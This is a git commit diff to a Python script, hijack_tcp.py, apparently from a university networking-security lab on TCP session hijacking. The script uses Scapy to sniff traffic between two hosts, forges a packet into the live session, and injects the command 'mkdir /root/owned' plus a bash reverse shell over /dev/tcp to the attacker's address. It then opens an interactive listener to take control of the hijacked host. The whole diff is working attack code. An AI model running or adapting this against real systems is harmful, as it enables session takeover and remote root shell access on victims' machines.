32f08ba643aa61066b1467606bc6fff1936804ad
Kevin Nanhekhan <k.r.nanhekhan@student.tudelft.nl>
2022-03-11 23:53:18 +0100

    Update hijack_tcp.py

--- transport_layer/hijack_tcp.py
+++ transport_layer/hijack_tcp.py
@@ -9,14 +9,12 @@ def pkt_handler(pkt):
         if pkt[TCP].flags == "A":
                 ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                 tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
-                raw = Raw(load="mkdir /root/owned && bash -c 'exec bash -i &>/dev/tcp/{}/{} <&1' \r\n".format(local_ip, local_port))
+                raw = Raw(load="mkdir /root/owned && bash -c 'exec bash -i &>/dev/tcp/{}/{} <&1' \n".format(local_ip, local_port))
+                listener = TCPServer((local_ip, local_port))
                 send(ip/tcp/raw, iface="br-tcphijack", verbose=0)
 
-
-                listener = TCPServer((local_ip, local_port))
                 for address in listener:
-                     print(address.recv())
-                     address.send(input() + "\r\n")
+                     address.interact()
 
 if __name__ == "__main__":
         src_addr = str(sys.argv[1])
@@ -24,3 +22,4 @@ if __name__ == "__main__":
 
         filter = "tcp and src host {} and dst host {}".format(src_addr, dst_addr)
         pkt = sniff(iface="br-tcphijack", filter=filter, prn=pkt_handler)
+
